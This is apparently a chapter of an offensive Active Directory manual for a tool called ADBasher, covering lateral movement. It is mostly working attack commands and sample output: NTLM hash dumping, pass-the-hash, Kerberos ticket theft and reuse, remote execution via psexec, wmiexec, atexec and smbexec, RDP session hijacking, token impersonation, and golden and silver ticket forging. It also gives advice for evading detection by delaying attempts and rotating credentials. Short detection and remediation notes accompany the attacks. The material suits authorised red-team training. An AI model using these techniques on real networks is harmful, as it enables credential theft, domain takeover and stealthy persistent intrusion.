## 6. Lateral Movement

Lateral movement is the process of moving from one compromised system to another within the network. This section covers techniques to spread access across the domain using various remote execution methods.

### 6.1 Pass-the-Hash and Pass-the-Ticket

**Objective:** Authenticate to remote systems using captured password hashes or Kerberos tickets without knowing plaintext passwords.

#### Pass-the-Hash (PtH)

**Concept:** NTLM authentication accepts password hashes directly. If you capture an NTLM hash, you can authenticate without cracking it.

**Attack Flow:**

```
┌────────────────────────────────────────────────────┐
│         Pass-the-Hash Attack Flow                  │
├────────────────────────────────────────────────────┤
│ 1. Dump NTLM hashes from compromised system       │
│ 2. Identify local/domain admin hashes             │
│ 3. Use hash to authenticate to other systems      │
│ 4. Execute commands remotely                      │
└────────────────────────────────────────────────────┘
```

**Hash Extraction (Requires Local Admin):**

```bash
# Using secretsdump.py (Impacket)
secretsdump.py contoso.local/administrator:Password123@192.168.10.50

# Expected output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# john.doe:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Hash format: username:RID:LM_hash:NTLM_hash:::
```

**Using the Hash (Pass-the-Hash):**

```bash
# Using CrackMapExec
crackmapexec smb 192.168.10.0/24 -u Administrator \
  -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth

# Using Impacket psexec
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
  administrator@192.168.10.51 "whoami"

# Using Impacket wmiexec
wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
  administrator@192.168.10.51
```

**ADBasher Automatic Lateral Movement:**

```bash
# ADBasher automatically uses discovered hashes
python3 "6 validcreds/automated/lateral_movement.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --method wmiexec

# Behind the scenes:
# 1. Query database for admin credentials (passwords + hashes)
# 2. Query database for all live targets
# 3. Attempt authentication to each target
# 4. Execute whoami command to verify
# 5. Store successful lateral movements in database
```

**Expected ADBasher Output:**

```
[INFO] Starting lateral movement (WMIExec method)
[+] Loaded 3 admin credentials from database
[+] Loaded 47 targets from database
[+] Attempting lateral movement to 47 hosts...

[+] SUCCESS: 192.168.10.51 (WORKSTATION01) - contoso\administrator
[+] SUCCESS: 192.168.10.52 (WORKSTATION02) - contoso\administrator
[+] SUCCESS: 192.168.10.53 (FILESERVER01) - contoso\administrator
[-] FAILED: 192.168.10.54 (EXCHANGE01) - Access Denied
[+] Lateral movement complete: 3/47 successful
[+] Results stored in database
```

**Success Metrics:**

- NTLM hashes extracted from compromised systems
- Hashes successfully used for authentication
- Remote code execution achieved on multiple systems

**OPSEC Considerations:**

- **Detection Likelihood:** **Medium**
- **IOCs:**
  - Event ID 4624 (Logon Type 3, Network logon)
  - Event ID 4672 (Special privileges assigned to new logon)
  - Unusual network logon patterns from single source

**OPSEC Evasion:**

```bash
# Slow down lateral movement attempts
# ADBasher stealth mode config:
evasion:
  lateral_movement_delay: 300  # 5 minutes between hosts

# Use different credentials for different targets
# (ADBasher automatically rotates)
```

#### Pass-the-Ticket (PtT)

**Concept:** Kerberos uses tickets for authentication. Capturing and reusing TGTs or TGS tickets allows authentication as that user.

**Ticket Extraction (Requires Admin on Source System):**

```bash
# Using Mimikatz (Windows)
mimikatz # sekurlsa::tickets /export

# Using Rubeus (Windows)
.\Rubeus.exe dump /luid:0x3e7 /nowrap

# Expected output:
# [*] Current LUID: 0x3e7
# [*] Ticket: doIFuj... [base64 TGT]
```

**Using the Ticket:**

```bash
# Import ticket (Windows)
.\Rubeus.exe ptt /ticket:[base64_ticket]

# Import ticket (Linux with impacket)
export KRB5CCNAME=/tmp/administrator.ccache
ticketConverter.py administrator.kirbi administrator.ccache

# Authenticate using ticket
smbclient.py -k -no-pass contoso.local/administrator@FILESERVER01.contoso.local
```

**Success Metrics:**

- Kerberos tickets extracted
- Tickets successfully imported
- Authentication achieved without password/hash

**OPSEC Rating:** **Medium** - Ticket extraction from LSASS triggers security alerts, ticket reuse less detectable.

### 6.2 Remote Code Execution Methods

**Objective:** Execute commands on remote systems using various Windows protocols and services.

#### WMIExec

**Advantages:**

- Doesn't create service (unlike PSExec)
- Doesn't write to disk
- Harder to detect

**Manual WMIExec:**

```bash
# Using Impacket
wmiexec.py contoso.local/administrator:Password123@192.168.10.50

# Using CrackMapExec
crackmapexec smb 192.168.10.50 -u administrator -p Password123 -x "whoami"
```

**Expected Output:**

```
[*] SMBv3.0 dialect used
[+] Executing: whoami
contoso\administrator

[*] Session established, waiting for command...
C:\> dir C:\Users
[Output of directory listing]
```

**Success Metrics:**

- WMI connection established
- Commands executed successfully
- Output retrieved

**OPSEC Rating:** **Medium-Low** - WMI is common in enterprise environments.

#### PSExec

**Advantages:**

- Well-known, widely compatible
- Interactive shell

**Disadvantages:**

- Creates Windows service (detected by EDR)
- Writes executable to ADMIN$ share

**Manual PSExec:**

```bash
# Using Impacket
psexec.py contoso.local/administrator:Password123@192.168.10.50

# Using CrackMapExec
crackmapexec smb 192.168.10.50 -u administrator -p Password123 --exec-method smbexec
```

**Expected Output:**

```
[*] Requesting shares on 192.168.10.50...
[*] Found writable share ADMIN$
[*] Uploading file XYZabc.exe
[*] Opening SVCManager on 192.168.10.50...
[*] Creating service XYZ on 192.168.10.50...
[*] Starting service XYZ...
[*] Got shell!

C:\Windows\system32> whoami
nt authority\system
```

**Success Metrics:**

- Service created and started
- SYSTEM shell obtained
- Commands executed

**OPSEC Rating:** **High** - Service creation heavily logged (Event ID 7045, 4697).

#### AtExec (Scheduled Task)

**Advantages:**

- Uses scheduled tasks instead of services
- Less commonly detected

**Manual AtExec:**

```bash
# Using Impacket
atexec.py contoso.local/administrator:Password123@192.168.10.50 "whoami"
```

**Expected Output:**

```
[*] Creating scheduled task \TMP123
[*] Running task
[*] Deleting task
[*] Output:
contoso\administrator
```

**Success Metrics:**

- Scheduled task created
- Command executed
- Task cleaned up

**OPSEC Rating:** **Medium** - Scheduled task creation logged (Event ID 4698).

#### SMBExec

**Advantages:**

- Doesn't use PSEXESVC like PSExec
- Uses native Windows commands

**Manual SMBExec:**

```bash
# Using Impacket
smbexec.py contoso.local/administrator:Password123@192.168.10.50
```

**Success Metrics:**

- SMB connection established
- Command execution via services
- Semi-interactive shell

**OPSEC Rating:** **Medium-High** - Creates and deletes services rapidly.

#### ADBasher Lateral Movement Module

**Multi-Method Approach:**

```bash
# ADBasher tries multiple methods automatically
python3 "6 validcreds/automated/lateral_movement.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --method all

# Tries methods in order:
# 1. WMIExec (lowest detection)
# 2. AtExec
# 3. SMBExec
# 4. PSExec (last resort, highest detection)
```

**Method Selection Matrix:**

| Method  | Detection Risk | Write to Disk | Service Creation | Speed  |
| ------- | -------------- | ------------- | ---------------- | ------ |
| WMIExec | Low            | No            | No               | Fast   |
| AtExec  | Medium         | No            | No (uses tasks)  | Medium |
| SMBExec | Medium-High    | Yes           | Yes (ephemeral)  | Fast   |
| PSExec  | High           | Yes           | Yes (persistent) | Fast   |

**Recommendation:** Use WMIExec for stealth engagements, PSExec only when others fail.

### 6.3 Session Hijacking

**Objective:** Hijack active user sessions on compromised systems to impersonate users without credentials.

**Prerequisites:** Local admin on system with active user sessions.

**Attack Flow:**

```
┌────────────────────────────────────────────────────┐
│         Session Hijacking Attack Flow              │
├────────────────────────────────────────────────────┤
│ 1. Gain local admin on target workstation         │
│ 2. Enumerate active user sessions                 │
│ 3. Identify high-privilege user sessions          │
│ 4. Inject into session or steal token             │
│ 5. Execute commands as that user                  │
└────────────────────────────────────────────────────┘
```

**Session Enumeration:**

```bash
# Using CrackMapExec
crackmapexec smb 192.168.10.0/24 -u administrator -p Password123 \
  --local-auth --sessions

# Expected output:
# 192.168.10.50  Session: CONTOSO\domain.admin (Active)
# 192.168.10.51  Session: CONTOSO\helpdesk.user (Active)
```

**Manual Session Hijacking (Windows):**

```bash
# Query sessions
query user

# Example output:
# USERNAME  SESSIONNAME  ID  STATE   IDLE TIME
# admin     rdp-tcp#1    2   Active  .
# user1     console      1   Active  5

# Hijack session
tscon 2 /dest:console

# Now operating as 'admin' user
```

**Automated Token Impersonation:**

```bash
# Using Invoke-TokenManipulation (PowerShell)
Invoke-TokenManipulation -ImpersonateUser -Username "domain.admin"

# Using Incognito (Metasploit)
load incognito
list_tokens -u
impersonate_token CONTOSO\\domain.admin
```

**Success Metrics:**

- Active sessions identified
- Session hijacked successfully
- Commands executed as hijacked user

**OPSEC Rating:** **Medium-High** - Session manipulation can trigger endpoint detection.

### 6.4 Golden and Silver Ticket Attacks

**Objective:** Forge Kerberos tickets to maintain persistent access without valid credentials.

#### Golden Ticket

**What is a Golden Ticket?**

A forged TGT signed with the KRBTGT account hash. Allows impersonation of any user (including non-existent users) to any service for 10 years.

**Prerequisites:**

- KRBTGT account NTLM hash (requires Domain Admin to obtain)
- Domain SID

**Creating a Golden Ticket:**

```bash
# Step 1: Dump KRBTGT hash (requires DA)
secretsdump.py contoso.local/administrator:Password123@DC01

# Output includes:
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ff46a9d8bd66c6efd77603da26796f35:::

# Step 2: Get domain SID
lookupsid.py contoso.local/administrator:Password123@DC01

# Output:
# S-1-5-21-1234567890-1234567890-1234567890 (Domain SID)

# Step 3: Create golden ticket (using Impacket ticketer.py)
ticketer.py -nthash ff46a9d8bd66c6efd77603da26796f35 \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain contoso.local FakeAdmin

# Output: FakeAdmin.ccache

# Step 4: Use ticket
export KRB5CCNAME=FakeAdmin.ccache
psexec.py -k -no-pass contoso.local/FakeAdmin@DC01.contoso.local
```

**Expected Output:**

```
[+] Golden ticket created successfully
[+] Valid for: 10 years
[+] User: FakeAdmin (doesn't need to exist in AD)
[+] Authenticating to DC01...
[*] Got shell!

C:\Windows\system32> whoami
contoso\fakeadmin
```

**Success Metrics:**

- KRBTGT hash obtained
- Golden ticket forged
- Persistent access maintained

**OPSEC Considerations:**

- **Detection Likelihood:** **Low** - Golden tickets bypass normal authentication logging
- **IOCs:**
  - Anomalous TGT lifetimes (default 10 hours, golden ticket 10 years)
  - Authentication from non-existent users
  - Unusual encryption types (RC4 instead of AES)

**Remediation (for reporting):**

```
Finding: Golden Ticket Created
Severity: CRITICAL
Impact: Persistent Domain Admin access for 10 years

Immediate Actions:
1. Reset KRBTGT password TWICE (wait 10 hours between resets)
   Invoke-Command -ComputerName DC01 {
     $krbtgt = Get-ADUser -Filter {name -eq "krbtgt"}
     Set-ADAccountPassword -Identity $krbtgt -Reset
   }

2. Monitor for anomalous ticket lifetimes (Event ID 4768, 4769)
3. Implement Azure ATP or similar behavioral analytics
```

#### Silver Ticket

**What is a Silver Ticket?**

A forged TGS ticket for a specific service signed with that service account's hash. Limited to one service but doesn't require KRBTGT hash.

**Prerequisites:**

- Service account NTLM hash (from Kerberoasting or secretsdump)
- Service SPN
- Domain SID

**Creating a Silver Ticket:**

```bash
# Step 1: Obtain service account hash
# (from Kerberoasting: svc_sql:ab3f72... or secretsdump)

# Step 2: Create silver ticket
ticketer.py -nthash ab3f72... -domain-sid S-1-5-21-1234567890... \
  -domain contoso.local -spn CIFS/FILESERVER01.contoso.local FakeUser

# Step 3: Use ticket
export KRB5CCNAME=FakeUser.ccache
smbclient.py -k -no-pass contoso.local/FakeUser@FILESERVER01.contoso.local
```

**Expected Output:**

```
[+] Silver ticket created for service: CIFS/FILESERVER01.contoso.local
[+] Valid for: 10 years
[+] Connecting to FILESERVER01...
[*] Shares available:
    IPC$
    ADMIN$
    C$
    SharedDocs
```

**Success Metrics:**

- Service account hash obtained
- Silver ticket forged
- Access to specific service maintained

**Silver Ticket vs Golden Ticket:**

| Aspect          | Golden Ticket           | Silver Ticket        |
| --------------- | ----------------------- | -------------------- |
| **Scope**       | Domain-wide             | Single service       |
| **Requires**    | KRBTGT hash (DA needed) | Service account hash |
| **Detection**   | Very difficult          | Difficult            |
| **Flexibility** | Any service             | One service only     |
| **Persistence** | Full domain control     | Service-specific     |

**OPSEC Rating:** **Low** - Silver tickets even harder to detect than golden tickets.

---

## Lateral Movement Decision Matrix

```
┌─────────────────────────────────────────────┐
│ What credentials do you have?              │
└──────────┬──────────────────────────────────┘
           │
           ├─ Plaintext Password
           │  └─ Use: WMIExec, PSExec, RDP
           │
           ├─ NTLM Hash
           │  └─ Use: Pass-the-Hash (WMIExec preferred)
           │
           ├─ Kerberos Ticket
           │  └─ Use: Pass-the-Ticket
           │
           ├─ KRBTGT Hash
           │  └─ Use: Golden Ticket (ultimate access)
           │
           └─ Service Account Hash
              └─ Use: Silver Ticket (service-specific)
```

**Best Practices for Lateral Movement:**

1. **Start Stealthy:** Begin with WMIExec (low detection)
2. **Escalate if Needed:** Fall back to PSExec only if others fail
3. **Rotate Credentials:** Use different credentials for different targets
4. **Add Jitter:** Randomize timing between lateral movement attempts
5. **Limit Scope:** Don't authenticate to every system, prioritize high-value targets

**Next Steps After Lateral Movement:**

1. **Domain Admin Achieved:** Establish persistence (Section 7)
2. **More Systems Compromised:** Dump credentials from each
3. **High-Value Systems Accessed:** Extract sensitive data, document findings
